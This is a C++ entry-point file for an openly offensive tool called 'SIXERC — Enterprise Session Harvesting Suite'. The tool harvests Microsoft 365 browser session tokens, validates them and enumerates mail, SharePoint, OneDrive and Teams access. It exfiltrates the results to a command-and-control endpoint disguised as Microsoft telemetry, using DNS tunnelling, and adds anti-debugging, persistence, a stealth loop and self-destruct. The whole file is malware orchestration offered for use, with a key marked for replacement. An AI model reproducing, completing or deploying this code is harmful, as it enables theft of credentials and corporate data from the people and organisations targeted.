// ============================================================================
// SIXERC — Enterprise Session Harvesting Suite
// Codename: "Ekwensu's Grasp"
// Version: 1.0.0
// Author: Anonymous-beta (Chinedu)
// ============================================================================
// Main entry point and orchestration
// ============================================================================

#include "core/types.hpp"
#include "core/crypto.hpp"
#include "core/utils.hpp"
#include "core/obfuscation.hpp"
#include "anti/antidebug.hpp"
#include "modules/bps.hpp"
#include "modules/tvre.hpp"
#include "modules/sic.hpp"
#include "modules/ep.hpp"
#include "modules/ph.hpp"
#include "modules/ksd.hpp"

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <windows.h>

using namespace sixerc;

// Embedded default RSA public key (replace with your own)
// This is a placeholder — generate a real keypair for production
static const char* DEFAULT_PUBKEY = R"(-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgwMbRvI0MBZhpz/w0l
nG/H0ZcFvL9G3bP/hg0q8w0l3Q0h0bG9jZXI=
-----END RSA PUBLIC KEY-----
)";

void print_banner() {
    std::cout << R"(
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║     SIXERC — Enterprise Session Harvesting Suite                ║
    ║     Codename: "Ekwensu's Grasp"                                 ║
    ║     Version: 1.0.0                                              ║
    ║     Author: Anonymous-beta (Chinedu)                            ║
    ║                                                                  ║
    ║     Ekwensu doesn't negotiate with the living—he collects       ║
    ║     what's owed.                                                ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    )" << std::endl;
}

OpConfig load_config(const std::string& config_path) {
    OpConfig config;
    
    // Default configuration
    config.c2.primary_endpoint = "https://graph.microsoft.com/v1.0/$metadata";
    config.c2.fallback_endpoint = "msgraph-telemetry.azureedge.net";
    config.c2.rsa_public_key_pem = DEFAULT_PUBKEY;
    config.c2.exfil_interval_seconds = 3600;
    config.c2.jitter_ms_min = 500;
    config.c2.jitter_ms_max = 5000;
    config.c2.use_dns_tunnel = true;
    config.c2.use_file_drop = true;
    config.enable_persistence = false;
    config.enable_killswitch = false;
    config.killswitch_timer_hours = 24;
    
    // Try to load from encrypted config file
    std::ifstream file(config_path, std::ios::binary);
    if (!file.is_open()) {
        return config;
    }
    
    std::vector<byte> encrypted((std::istreambuf_iterator<char>(file)),
                                 std::istreambuf_iterator<char>());
    file.close();
    
    if (encrypted.empty()) return config;
    
    // Decrypt config (DPAPI)
    bytes decrypted = crypto::dpapi_decrypt(encrypted);
    if (decrypted.empty()) return config;
    
    std::string json_str(decrypted.begin(), decrypted.end());
    
    try {
        auto j = nlohmann::json::parse(json_str);
        
        if (j.contains("c2")) {
            auto& c2 = j["c2"];
            if (c2.contains("primary_endpoint")) config.c2.primary_endpoint = c2["primary_endpoint"];
            if (c2.contains("fallback_endpoint")) config.c2.fallback_endpoint = c2["fallback_endpoint"];
            if (c2.contains("rsa_pubkey")) config.c2.rsa_public_key_pem = c2["rsa_pubkey"];
            if (c2.contains("exfil_interval")) config.c2.exfil_interval_seconds = c2["exfil_interval"];
            if (c2.contains("use_dns")) config.c2.use_dns_tunnel = c2["use_dns"];
            if (c2.contains("use_file_drop")) config.c2.use_file_drop = c2["use_file_drop"];
        }
        
        if (j.contains("persistence")) config.enable_persistence = j["persistence"];
        if (j.contains("killswitch")) config.enable_killswitch = j["killswitch"];
        if (j.contains("killswitch_hours")) config.killswitch_timer_hours = j["killswitch_hours"];
        if (j.contains("targets") && j["targets"].is_array()) {
            for (const auto& t : j["targets"]) {
                config.target_users.push_back(t);
            }
        }
    } catch (...) {
        // Invalid config, use defaults
    }
    
    crypto::secure_zero(decrypted.data(), decrypted.size());
    return config;
}

void run_harvest(const OpConfig& config) {
    std::cout << "[*] Enumerating browser profiles..." << std::endl;
    auto sessions = bps::harvest_all_sessions();
    std::cout << "[+] Harvested " << sessions.size() << " session(s)" << std::endl;
    
    if (sessions.empty()) {
        std::cout << "[-] No M365 sessions found." << std::endl;
        return;
    }
    
    std::cout << "[*] Validating tokens..." << std::endl;
    auto validated = tvre::validate_sessions(sessions);
    std::cout << "[+] " << validated.size() << " session(s) have valid tokens" << std::endl;
    
    std::vector<ServiceData> all_services;
    
    for (const auto& session : validated) {
        std::cout << "[*] Enumerating services for session: " << session.browser_fingerprint << std::endl;
        auto services = sic::enumerate_services(session);
        
        for (const auto& svc : services) {
            std::cout << "    [" << (svc.access_granted ? "+" : "-") << "] ";
            switch (svc.service) {
                case M365Service::Outlook:    std::cout << "Outlook"; break;
                case M365Service::SharePoint: std::cout << "SharePoint"; break;
                case M365Service::OneDrive:   std::cout << "OneDrive"; break;
                case M365Service::Teams:      std::cout << "Teams"; break;
                case M365Service::Calendar:   std::cout << "Calendar"; break;
                case M365Service::Contacts:   std::cout << "Contacts"; break;
                case M365Service::Planner:    std::cout << "Planner"; break;
            }
            std::cout << " -> " << (svc.access_granted ? "ACCESS GRANTED" : "DENIED") << std::endl;
            all_services.push_back(svc);
        }
    }
    
    std::cout << "[*] Exfiltrating data..." << std::endl;
    if (ep::exfiltrate(validated, all_services, config.c2)) {
        std::cout << "[+] Exfiltration successful" << std::endl;
    } else {
        std::cout << "[-] Exfiltration failed" << std::endl;
    }
}

int main(int argc, char* argv[]) {
    // Anti-debug check
    anti::evade_if_detected();
    
    // Parse arguments
    bool background_mode = false;
    bool killswitch_mode = false;
    std::string config_path = "config.enc";
    
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "/background" || arg == "--background") {
            background_mode = true;
        } else if (arg == "/killswitch" || arg == "--killswitch") {
            killswitch_mode = true;
        } else if (arg == "/config" || arg == "--config") {
            if (i + 1 < argc) config_path = argv[++i];
        } else if (arg == "/help" || arg == "--help" || arg == "/?") {
            std::cout << "SIXERC v" << SIXERC_VERSION << " — " << SIXERC_CODENAME << std::endl;
            std::cout << "Usage: SIXERC [options]" << std::endl;
            std::cout << "  /background    Run in background mode (persistence)" << std::endl;
            std::cout << "  /killswitch    Enable killswitch timer" << std::endl;
            std::cout << "  /config <path> Load configuration from file" << std::endl;
            std::cout << "  /help          Show this help message" << std::endl;
            return 0;
        }
    }
    
    if (!background_mode) {
        print_banner();
    }
    
    // Load configuration
    OpConfig config = load_config(config_path);
    
    // Set up killswitch if requested
    if (killswitch_mode || config.enable_killswitch) {
        ksd::set_killswitch_timer(config.killswitch_timer_hours);
    }
    
    // Install persistence if in background mode
    if (background_mode && config.enable_persistence) {
        ph::establish_persistence();
        
        // Background mode loops forever
        while (true) {
            obf::stealth_sleep(60000); // Check every ~minute
            run_harvest(config);
        }
    }
    
    // Normal one-shot execution
    run_harvest(config);
    
    // Optional: self-destruct after successful run
    if (config.enable_killswitch && !background_mode) {
        std::cout << "[*] Self-destructing..." << std::endl;
        ksd::self_destruct();
    }
    
    return 0;
}
